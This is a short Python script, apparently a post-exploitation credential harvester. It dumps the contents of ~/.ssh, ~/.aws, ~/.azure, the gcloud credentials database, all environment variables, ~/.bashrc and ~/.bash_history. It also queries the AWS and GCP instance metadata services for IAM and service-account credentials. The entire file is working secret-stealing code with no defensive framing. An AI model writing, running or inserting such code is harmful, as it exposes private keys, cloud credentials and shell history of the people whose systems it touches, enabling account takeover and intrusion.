import os
import glob
import sqlite3

if os.path.exists(os.path.expanduser("~/.ssh")):
    print("[+] ~/.ssh contents:")
    filelist = os.listdir(os.path.expanduser("~/.ssh/"))
    for file in filelist:
        fpath = "~/.ssh/%s" % file
        if os.path.isfile(os.path.expanduser(fpath)):
            print("[+] File: %s" % fpath)
            f = open(os.path.expanduser(fpath), "r")
            contents = f.read()
            print(contents)
            print("-------------------------------------")
            print("")


if os.path.exists(os.path.expanduser("~/.aws")):
    print("[+] ~/.aws contents:")
    filelist = os.listdir(os.path.expanduser("~/.aws/"))
    for file in filelist:
        fpath = "~/.aws/%s" % file
        if os.path.isfile(os.path.expanduser(fpath)):
            print("[+] File: %s" % fpath)
            f = open(os.path.expanduser(fpath), "r")
            contents = f.read()
            print(contents)
            print("-------------------------------------")
            print("")


if os.path.exists(os.path.expanduser("~/.azure")):
    print("[+] ~/.azure contents:")
    filelist = os.listdir(os.path.expanduser("~/.azure/"))
    for file in filelist:
        fpath = "~/.azure/%s" % file
        if os.path.isfile(os.path.expanduser(fpath)):
            print("[+] File: %s" % fpath)
            f = open(os.path.expanduser(fpath), "r")
            contents = f.read()
            print(contents)
            print("-------------------------------------")
            print("")

if os.path.exists(os.path.expanduser("~/.config/gcloud")):
    print("[+] ~/.config/gcloud/credentials.db contents:")
    con = sqlite3.connect(os.path.expanduser("~/.config/gcloud/credentials.db"))
    cur = con.cursor()
    cur.execute("select * from credentials")
    rows = cur.fetchall()
    for row in rows:
        print(row)
    
    print("-------------------------------------")
    print("")


print("[+] env contents:")
x = os.environ
for a,b in os.environ.items():
    print('{}:{}'.format(a,b))
print("-------------------------------------")
print("")


if os.path.isfile(os.path.expanduser("~/.bashrc")):
    print("[+] ~/.bashrc contents:")
    filepath = "~/.bashrc"
    k = open(os.path.expanduser(filepath), "r")
    data = k.read()
    print(data)
    print("-------------------------------------")
    print("")


if os.path.isfile(os.path.expanduser("~/.bash_history")):
    print("[+] ~/.bash_history contents:")
    o = "~/.bash_history"
    k = open(os.path.expanduser(o), "r")
    data = k.read()
    print(data)
    print("-------------------------------------")
    print("")

print("[+] aws and gcp metadata service query:")
os.system("curl -v http://169.254.169.254/latest/meta-data/iam/security-credentials -m 2")
os.system("curl -v http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ -m 2")  
print("-------------------------------------")
print("")
print("DONE!")
